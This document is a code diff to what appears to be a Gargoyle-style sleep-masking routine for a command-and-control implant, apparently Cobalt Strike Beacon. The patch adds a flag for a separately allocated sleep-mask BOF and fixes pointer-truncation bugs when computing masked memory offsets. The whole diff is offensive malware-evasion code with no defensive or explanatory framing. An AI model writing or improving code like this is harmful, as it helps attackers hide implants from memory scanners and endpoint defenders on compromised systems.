@@ -8,7 +8,7 @@
 void    * gtrampoline = NULL;
 GARGLEP * gparms = NULL;
 
-void gargle_setup_parms(void * begin, void * end) {
+void gargle_setup_parms(void * begin, void * end, int mask_fn_in_beacon) {
 	DWORD * index;
 	DWORD a, b, temp;
 
@@ -32,15 +32,24 @@ void gargle_setup_parms(void * begin, void * end) {
 		if (a == 0 && b == 0) {
 			break;
 		}
+		if (a == -1 || b == -1) {
+			if (!mask_fn_in_beacon) {
+				/* Sleep-mask BOF is a separate alloc; do not treat -1 as a
+				 * 32-bit offset from beacon_ptr (truncates and self-masks). */
+				a = 0;
+				b = 0;
+				memcpy(index, &a, sizeof(DWORD));
+				memcpy(index + 1, &b, sizeof(DWORD));
+				break;
+			}
+		}
 		if (a == -1) {
-		    /* Replace this with the sleep mask function end location */
-			temp = (DWORD)end - (DWORD)gparms->beacon_ptr;
+			temp = (DWORD)((DWORD_PTR)end - (DWORD_PTR)gparms->beacon_ptr);
 			memcpy(index, &temp, sizeof(DWORD));
 			a = *index;
 		}
 		if (b == -1) {
-		    /* Replace this with the sleep mask function begin location */
-			temp = (DWORD)begin - (DWORD)gparms->beacon_ptr;
+			temp = (DWORD)((DWORD_PTR)begin - (DWORD_PTR)gparms->beacon_ptr);
 			memcpy(index + 1, &temp, sizeof(DWORD));
 			b = *(index + 1);
 		}
@@ -53,5 +62,5 @@ void gargle_trampoline(void * end, void * begin) {
 	if (gtrampoline != NULL)
 		return;
 	gtrampoline = begin;
-	gargle_setup_parms(begin, end);
+	gargle_setup_parms(begin, end, 1);
 }
